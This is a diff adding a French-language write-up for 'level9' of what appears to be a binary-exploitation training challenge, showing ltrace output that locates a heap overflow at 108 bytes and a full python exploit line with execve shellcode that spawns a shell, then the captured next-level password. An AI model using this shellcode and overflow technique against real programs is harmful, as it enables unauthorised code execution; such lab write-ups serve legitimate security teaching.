@@ -1,0 +1,58 @@
+En lancant le programme, rien de special n'apparait.
+En envoyant une grande chaine de char (~150) il y a un segfault.
+
+$> ./level9 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
+Segmentation fault (core dumped)
+
+Avec ltrace on observe cela:
+
+$> ltrace ./level9 a
+__libc_start_main(0x80485f4, 2, 0xbffff7c4, 0x8048770, 0x80487e0 <unfinished ...>
+_ZNSt8ios_base4InitC1Ev(0x8049bb4, 0xb7d79dc6, 0xb7eebff4, 0xb7d79e55, 0xb7f4a330)   = 0xb7fce990
+__cxa_atexit(0x8048500, 0x8049bb4, 0x8049b78, 0xb7d79e55, 0xb7f4a330)                = 0
+_Znwj(108, 0xbffff7c4, 0xbffff7d0, 0xb7d79e55, 0xb7fed280)                           = 0x804a008
+_Znwj(108, 5, 0xbffff7d0, 0xb7d79e55, 0xb7fed280)                                    = 0x804a078
+strlen("a")                                                                          = 1
+memcpy(0x0804a00c, "a", 1)                                                           = 0x0804a00c
+_ZNSt8ios_base4InitD1Ev(0x8049bb4, 11, 0x804a078, 0x8048738, 0x804a00c)              = 0xb7fce4a0
++++ exited (status 11) +++
+
+$> ltrace ./level9 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
+__libc_start_main(0x80485f4, 2, 0xbffff734, 0x8048770, 0x80487e0 <unfinished ...>
+_ZNSt8ios_base4InitC1Ev(0x8049bb4, 0xb7d79dc6, 0xb7eebff4, 0xb7d79e55, 0xb7f4a330)   = 0xb7fce990
+__cxa_atexit(0x8048500, 0x8049bb4, 0x8049b78, 0xb7d79e55, 0xb7f4a330)                = 0
+_Znwj(108, 0xbffff734, 0xbffff740, 0xb7d79e55, 0xb7fed280)                           = 0x804a008
+_Znwj(108, 5, 0xbffff740, 0xb7d79e55, 0xb7fed280)                                    = 0x804a078
+strlen("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab"...)                                        = 150
+memcpy(0x0804a00c, "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab"..., 150)                       = 0x0804a00c
+--- SIGSEGV (Segmentation fault) ---
++++ killed by SIGSEGV +++
+
+Il y a deux appels a la fonction _Znwj, avec une taille de 108, en essayant de reduire notre argument a 108, on remarque que c'est l'offset du segfault
+
+$> ltrace ./level9 $(python -c 'print "A" * 108')
+__libc_start_main(0x80485f4, 2, 0xbffff764, 0x8048770, 0x80487e0 <unfinished ...>
+_ZNSt8ios_base4InitC1Ev(0x8049bb4, 0xb7d79dc6, 0xb7eebff4, 0xb7d79e55, 0xb7f4a330)   = 0xb7fce990
+__cxa_atexit(0x8048500, 0x8049bb4, 0x8049b78, 0xb7d79e55, 0xb7f4a330)                = 0
+_Znwj(108, 0xbffff764, 0xbffff770, 0xb7d79e55, 0xb7fed280)                           = 0x804a008
+_Znwj(108, 5, 0xbffff770, 0xb7d79e55, 0xb7fed280)                                    = 0x804a078
+strlen("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...)                                        = 108
+memcpy(0x0804a00c, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 108)                       = 0x0804a00c
+_ZNSt8ios_base4InitD1Ev(0x8049bb4, 0x41414147, 0x804a078, 0x8048738, 0x804a00c)      = 0xb7fce4a0
++++ exited (status 71) +++
+
+
+memcpy(0x0804a00c, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 108)                       = 0x0804a00c
+On rempli de A cette adresse: 0x0804a00c => '\x0c\xa0\x04\x08'
+
+
+
+
+
+
+
+Adresse(4) + shellcode(21) + 83 (=108 - 4 - 21) +  adresse du retour de memcpy
+
+$> ./level9 `python -c "print '\x10\xa0\x04\x08' + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' + 'A' * 83 + '\x0c\xa0\x04\x08'"`
+$> cat /home/user/bonus0/.pass
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
